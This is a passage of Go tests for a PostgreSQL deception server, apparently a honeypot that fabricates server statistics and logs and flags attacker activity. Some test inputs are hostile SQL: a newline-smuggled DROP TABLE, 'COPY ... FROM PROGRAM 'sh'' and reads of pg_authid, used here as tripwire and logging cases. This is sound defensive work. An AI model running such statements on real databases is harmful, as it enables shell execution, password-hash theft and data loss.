	app := pgDecoy(t, &config.PostgresDeception{
		Mode: "decoy", Databases: []string{"postgres", "template0", "template1", "warehouse"},
	})
	if got := app.appDatabase(); got != "warehouse" {
		t.Errorf("the application's database is %q", got)
	}
	if got := onePG(t, askAs(t, d, "SELECT current_database()", se)); got != "alpha" {
		t.Errorf("current_database answered %q", got)
	}
	// And a list of nothing but templates falls back to the one database every
	// server has, rather than to a template a client cannot connect to.
	tmpl := pgDecoy(t, &config.PostgresDeception{Mode: "decoy", Databases: []string{"template0", "template1"}})
	if got := tmpl.appDatabase(); got != "postgres" {
		t.Errorf("a list of nothing but templates answered %q", got)
	}
}

// The fabricated numbers move with the clock and stay inside their bands, because
// a gauge pinned to one value is a server nobody is using.
func TestTheFabricatedNumbersMoveAndStayBounded(t *testing.T) {
	d := pgDecoy(t, &config.PostgresDeception{Mode: "decoy", Seed: 7})
	at := time.Date(2025, 3, 5, 14, 0, 0, 0, time.UTC)
	seen := map[int]bool{}
	for i := 0; i < 60; i++ {
		when := at.Add(time.Duration(i) * time.Minute)
		d.values.SetClockForTest(func() time.Time { return when })
		n := d.gauge(addrBackends)
		if n < 1 || n > 40 {
			t.Fatalf("backends %d, which is outside the band", n)
		}
		seen[n] = true
	}
	if len(seen) < 2 {
		t.Errorf("the backend count took %d values over an hour", len(seen))
	}
	// pg_stat_activity is built from it, so it must never answer no rows: a
	// server with nothing on it has nothing connected, and this connection is.
	d.values.SetClockForTest(func() time.Time { return at })
	if rows := len(askPG(t, d, "SELECT * FROM pg_stat_activity").rows); rows < 1 {
		t.Errorf("pg_stat_activity answered %d rows", rows)
	}
}

// A statement's text never reaches a log line as several lines, because a record
// built out of them would be several records.
func TestAStatementCarryingNewlinesBecomesOneRecord(t *testing.T) {
	if got := oneLine("SELECT 1;\nDROP TABLE t;\r\n"); strings.ContainsAny(got, "\r\n") {
		t.Errorf("oneLine left %q", got)
	}
	if got := oneLine("a\x00b"); strings.ContainsRune(got, 0) {
		t.Errorf("oneLine left a NUL in %q", got)
	}
	if got := oneLine("SELECT 1"); got != "SELECT 1" {
		t.Errorf("oneLine changed %q", got)
	}
}

// credentialLen reads a C string's length, which is what goes into the record
// where a password would have been.
func TestOnlyTheCredentialsLengthIsTaken(t *testing.T) {
	if got := credentialLen([]byte("md5abc\x00")); got != 6 {
		t.Errorf("credentialLen is %d", got)
	}
	if got := credentialLen([]byte("nozero")); got != 6 {
		t.Errorf("credentialLen of an unterminated field is %d", got)
	}
	if got := credentialLen([]byte{0}); got != 0 {
		t.Errorf("credentialLen of an empty credential is %d", got)
	}
}

// The startup summary, which is what an operator reads about who arrived.
func TestTheStartupSummaryNamesWhatTheClientAnnounced(t *testing.T) {
	got := startupSummary(&session{user: "postgres", database: "appdb", app: "psql"})
	for _, want := range []string{"role postgres", "database appdb", "application psql"} {
		if !strings.Contains(got, want) {
			t.Errorf("the summary %q does not name %q", got, want)
		}
	}
	// A client that announced nothing but a role summarises as one, rather than
	// as a line with empty fields in it.
	if got := startupSummary(&session{user: "app"}); got != "role app" {
		t.Errorf("the summary is %q", got)
	}
	// A role of a thousand octets is clipped, because it comes off the network.
	long := startupSummary(&session{user: strings.Repeat("a", 4096)})
	if len(long) > 1024 {
		t.Errorf("the summary is %d octets", len(long))
	}
}

// ddlTag is the name a driver reads back for a schema change.
func TestTheSchemaChangeTagNamesWhatWasDone(t *testing.T) {
	for _, c := range [][2]string{
		{"create table t (a int)", "CREATE TABLE"},
		{"drop index i", "DROP INDEX"},
		{"vacuum", "VACUUM"},
		{"vacuum;", "VACUUM"},
		{"", "OK"},
	} {
		if got := ddlTag(c[0]); got != c[1] {
			t.Errorf("ddlTag(%q) is %q, want %q", c[0], got, c[1])
		}
	}
}

// identifiers is what every recogniser and every tripwire is built on, so what it
// treats as a word is the whole of their precision.
func TestIdentifiersKeepsAQualifiedNameWholeAndSplit(t *testing.T) {
	got := strings.Join(identifiers("SELECT * FROM pg_catalog.pg_authid WHERE x=1"), " ")
	for _, want := range []string{"pg_catalog.pg_authid", "pg_catalog", "pg_authid", "select"} {
		if !strings.Contains(got, want) {
			t.Errorf("identifiers gave %q, which does not include %q", got, want)
		}
	}
	if mentions("select * from programs", "program") {
		t.Error("a table named programs is read as PROGRAM")
	}
	if !mentions("copy t from program 'sh'", "program") {
		t.Error("COPY FROM PROGRAM does not mention program")
	}
	// A name in a quoted string still counts, because a statement that reaches
	// pg_authid through one reaches it.
	if !mentions("select 'x' from pg_authid", "pg_authid") {
		t.Error("pg_authid in a statement with a string in it does not count")
	}
	if got := strconv.Itoa(len(identifiers(""))); got != "0" {
		t.Errorf("identifiers of nothing gave %s words", got)
	}
}
